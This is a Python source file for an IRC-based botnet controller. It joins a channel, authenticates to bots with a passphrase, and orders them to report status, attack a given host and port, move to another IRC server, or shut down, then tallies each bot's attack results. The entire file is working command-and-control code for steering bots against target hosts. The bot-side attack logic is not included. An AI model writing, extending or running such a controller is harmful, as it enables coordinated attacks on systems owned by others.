import time
import socket 
import sys 
import threading

class conBot:
    
    def setup(self, host, port, channel, phrase):
        self.acceptedComs = ["status", "attack", "move", "quit", "shutdown"]
        self.HOST = host
        self.PORT = int(port)
        self.CHANNEL = channel
        self.PHRASE = phrase
        self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # CONTROLLER INFO
        self.conNick = "SLAVE_DRIVER738"
        self.liveConnection = False # Flag to see if controller connection to IRC Server is active
        self.command = None

        # BOT INFO
        self.botList = []
        self.botsSuccessful = []
        self.botsFailed = {}
        self.botsMoved = []
        self.botsMoveFailed = []
        self.botsDisconnected = []

        try:
            self.IRCSOCKET.connect((self.HOST, self.PORT))
        except Exception as e:
            sys.stderr.write("Error: " + str(e))
            sys.exit(0)

        

    def IRCconnect(self):
        self.sendData("NICK {}\n" .format(self.conNick))
        self.sendData("USER bot * * :{}\n" .format(self.conNick))
        self.sendData("JOIN #{}\n" .format(self.CHANNEL))
        resp = self.getData()
        return "433" in resp

    # Get response from Bot 
    def getData(self):
        return self.IRCSOCKET.recv(2048).decode().strip()

    def sendData(self, msg):
        self.IRCSOCKET.send(msg.encode())

    def sendCommand(self, receiver, msg):
        self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))
    

    def handleResponse(self, prefix, text):
        if text.find("Correct pass") != -1:
            self.botList.append(text.split("-")[1]) 
        elif text.find("Attack successful") != -1:
            self.botsSuccessful.append(text.split("-")[1])
        elif text.find("Attack failed") != -1:
            self.botsFailed[text.split(" - ")[1]] = [text.split(" - ")[2]]
        elif text.find("Move successful") != -1:
            self.botsMoved.append(text.split("-")[1])
        elif text.find("Move failed") != -1:
            self.botsMoveFailed.append(text.split("-")[1])
        elif text.find("Shutdown successful") != -1:
            self.botsDisconnected.append(text.split("-")[1])
            

    def reader(self):
        try:
            while True:
                response = self.getData() 
                if(response != ""):                                         
                        if response.find("PRIVMSG") != -1:                           
                            name = response.split('!',1)[0][1:]
                            message = response.split('PRIVMSG',1)[1].split(':',1)[1]
                            self.handleResponse(name, message)                              
                        elif response.find("PING") != -1:
                            self.sendData("PONG {}: :\r\n".format(self.HOST))                                                                          
     
        except Exception as e:
            time.sleep(5)
            self.reader()


    # takes command input from user and sends it to bots
    def commandHandler(self):
        while True:

            userCommand = input("command> ")
            self.command = userCommand.split()

            if self.command[0] not in self.acceptedComs:
                print("Incorrect Command Used")
                print("Valid commands are: status, attack, move, quit, shutdown")
                continue

            self.sendCommand("#" + self.CHANNEL, self.PHRASE)

            if (self.command[0] == "status"):
                self.botList = []
                self.sendCommand("#" + self.CHANNEL, self.command[0])
                time.sleep(5)
                self.botList.sort
                if len(self.botList) == 0:
                    print("Found 0 bots.")
                elif len(self.botList) == 1:
                    print("Found {} bot: {}".format(str(len(self.botList)),','.join(self.botList)))
                else:
                    print("Found {} bots: {}".format(str(len(self.botList)),','.join(self.botList)))

            elif (self.command[0] == "attack"):
                if (len(self.command) == 3):
                    self.botsSuccessful = []
                    self.botsFailed = {}
                    self.sendCommand("#" + self.CHANNEL, userCommand)
                    time.sleep(5)
                    for bot in self.botsSuccessful:
                        print("{}: attack successful".format(bot))
                    for bot in self.botsFailed:
                        print("{}: attack failed, {}".format(bot, self.botsFailed[bot]))
                else:
                    print("Incorrect usage of command: attack <host-name> <port>")

            elif (self.command[0] == "move"):
                if(len(self.command) == 4):
                    self.botsMoved = []
                    self.botsMoveFailed = []
                    self.sendCommand("#" + self.CHANNEL, userCommand)
                    time.sleep(5)
                    for bots in self.botsMoved:
                        print("{}: move successful".format(bots))
                    for bots in self.botsMoveFailed:
                        print("{}: move failed".format(bots))
                else:
                    print("Incorrect usage of command: move <host-name> <port> <channel>")
            elif (self.command[0] == "quit"):
                self.IRCSOCKET.close()
                sys.exit(0)
            elif (self.command[0] == "shutdown"):
                self.botsDisconnected = []
                self.sendCommand("#" + self.CHANNEL, self.command[0])
                time.sleep(5)
                for bot in self.botsDisconnected:
                    print("{}: shutting down".format(bot))
                print("Total: {} bots shut down".format(len(self.botsDisconnected)))
            
def main():
    
    invalidNick = True
    noConnection = True
        # Get sys.argv
    if len(sys.argv) != 5:
        print("Wrong number of arguments")
        sys.exit() 
    
    HOST = sys.argv[1]
    PORT = sys.argv[2]
    CHANNEL = sys.argv[3]
    PHRASE = sys.argv[4]

    # Check if port is in valid range 
    if not PORT.isdigit():
        print("Invalid port.")
        sys.exit() 
    
    cbot = conBot()

    # Keep connection to IRC server 
    while True:
        
        # set up controller bot and try to connect to the IRC
        try:
            cbot.setup(HOST, PORT, CHANNEL, PHRASE)
        except Exception as e:
            print("{} Trying to reconnect..." .format(e))
            continue

        while noConnection:
            noConnection = cbot.IRCconnect()
        
        
        print("Controller is running. Connected with nick: " + cbot.conNick)


        # create a thread that will continuously read from the IRC
        readThread = threading.Thread(target = cbot.reader)
        readThread.daemon = True
        readThread.start()
        
        cbot.commandHandler()



if __name__ == "__main__":
    main()


